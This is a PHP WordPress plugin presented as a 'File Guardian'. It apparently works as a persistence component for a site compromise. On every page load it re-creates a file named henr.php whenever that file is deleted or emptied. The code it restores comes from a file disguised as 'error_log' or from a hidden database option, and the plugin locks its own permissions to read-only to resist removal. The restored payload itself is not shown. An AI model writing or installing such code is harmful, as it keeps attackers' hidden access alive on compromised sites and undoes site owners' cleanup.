<?php
/**
 * Plugin Name: File Guardian (Henry Restorer - Dual Backup)
 * Description: Monitors henr.php, auto-restores from error_log or DB, and auto-locks its own permissions to read-only.
 * Version: 2.1.0
 */

if (!defined('ABSPATH')) {
    exit;
}

class HenryFileGuardian {

    private $target_file;
    private $backup_log_file;
    private $activity_log_file;
    private $guardian_self_file;
    private $db_option_key = 'henry_code_backup';

    public function __construct() {
        $plugin_dir = rtrim(plugin_dir_path(__FILE__), '/\\') . DIRECTORY_SEPARATOR;

        $this->guardian_self_file = __FILE__;
        $this->target_file        = $plugin_dir . 'henr.php';
        $this->backup_log_file    = $plugin_dir . 'error_log';
        $this->activity_log_file  = $plugin_dir . 'activity_log.txt';

        // Auto-lock this guardian file to 0444 if it isn't already read-only
        $this->ensure_read_only_self();

        add_action('admin_init', [$this, 'sync_db_backup']);
        add_action('init', [$this, 'verify_and_restore']);
    }

    /**
     * Checks if file-guardian.php has write permissions, and locks it to 0444 (Read-Only).
     */
    private function ensure_read_only_self() {
        clearstatcache(true, $this->guardian_self_file);
        
        // Get octal permissions (e.g., '0644')
        $current_perms = substr(sprintf('%o', fileperms($this->guardian_self_file)), -4);

        if ($current_perms !== '0444') {
            @chmod($this->guardian_self_file, 0444);
        }
    }

    public function sync_db_backup() {
        if (file_exists($this->backup_log_file) && is_readable($this->backup_log_file)) {
            $log_content = file_get_contents($this->backup_log_file);
            if (!empty(trim($log_content))) {
                $current_db_code = get_option($this->db_option_key);
                if ($current_db_code !== $log_content) {
                    update_option($this->db_option_key, $log_content, 'no');
                }
            }
        }
    }

    public function verify_and_restore() {
        clearstatcache(true, $this->target_file);

        $needs_restoration = false;
        $reason = '';

        if (!file_exists($this->target_file)) {
            $needs_restoration = true;
            $reason = 'File was deleted/missing';
        } elseif (filesize($this->target_file) === 0 || trim((string)@file_get_contents($this->target_file)) === '') {
            $needs_restoration = true;
            $reason = 'File was blanked/empty';
        }

        if ($needs_restoration) {
            $this->restore_file($reason);
        }
    }

    private function restore_file($reason) {
        $backup_code = '';
        $source = '';

        if (file_exists($this->backup_log_file) && is_readable($this->backup_log_file)) {
            $raw_file = file_get_contents($this->backup_log_file);
            if (!empty(trim($raw_file))) {
                $backup_code = $raw_file;
                $source = 'error_log';
            }
        }

        if (empty($backup_code)) {
            $db_code = get_option($this->db_option_key);
            if (!empty($db_code) && is_string($db_code) && !empty(trim($db_code))) {
                $backup_code = $db_code;
                $source = 'database';
            }
        }

        if (empty($backup_code)) {
            $this->log_activity($reason, false, 'Failed: Both error_log and DB backups are empty/unavailable');
            return;
        }

        $bytes = @file_put_contents($this->target_file, $backup_code, LOCK_EX);
        $written = ($bytes !== false);

        $status_msg = $written 
            ? "Restored {$bytes} bytes using [Source: {$source}]" 
            : "Write permission failed on target dir using [Source: {$source}]";

        $this->log_activity($reason, $written, $status_msg);

        if ($written && $source === 'database' && (!file_exists($this->backup_log_file) || filesize($this->backup_log_file) === 0)) {
            @file_put_contents($this->backup_log_file, $backup_code, LOCK_EX);
        }
    }

    private function log_activity($reason, $status, $details = '') {
        $timestamp  = current_time('mysql');
        $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN_IP';
        $status_txt = $status ? 'SUCCESS' : 'FAILED';

        $entry = sprintf(
            "[%s] STATUS: %s | REASON: %s | DETAILS: %s | IP: %s\n",
            $timestamp,
            $status_txt,
            $reason,
            $details,
            $ip_address
        );

        @file_put_contents($this->activity_log_file, $entry, FILE_APPEND | LOCK_EX);
    }
}

new HenryFileGuardian();